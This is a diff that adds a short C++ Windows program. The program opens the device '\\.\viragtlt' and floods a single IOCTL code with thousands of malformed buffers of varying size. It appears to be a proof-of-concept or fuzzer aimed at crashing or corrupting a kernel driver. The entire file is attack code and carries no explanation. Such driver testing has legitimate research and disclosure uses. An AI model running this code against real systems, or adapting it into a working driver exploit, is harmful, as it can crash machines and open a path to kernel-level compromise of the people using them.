@@ -1,0 +1,32 @@
+#include "stdafx.h"
+#include <stdio.h>
+#include <windows.h>
+
+ 
+int main(int argc, char *argv[]) 
+{
+    HANDLE     hDevice;
+    DWORD      dwRetBytes = 0;  
+	char szinput[0x1000] = {0};
+	memset(szinput, 0x41, 1);
+ 
+    hDevice = CreateFile("\\\\.\\viragtlt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING , 0, NULL);
+
+	
+	for (int j = 0; j < 10; j++)
+	{
+		for (DWORD i = 50; i < 0xffff; i++)
+		{
+			char*szBuf = new char[i];
+			memset(szBuf, i%0xff, i);
+			*(DWORD*)(szBuf+4) = i;
+
+			DeviceIoControl(hDevice,  0x82730068, (LPVOID)szBuf, i%0x100, (LPVOID)szinput, 4, &dwRetBytes, NULL); 
+			delete[] szBuf;
+		}
+	}
+	
+
+    CloseHandle(hDevice); 
+    return 0;
+}
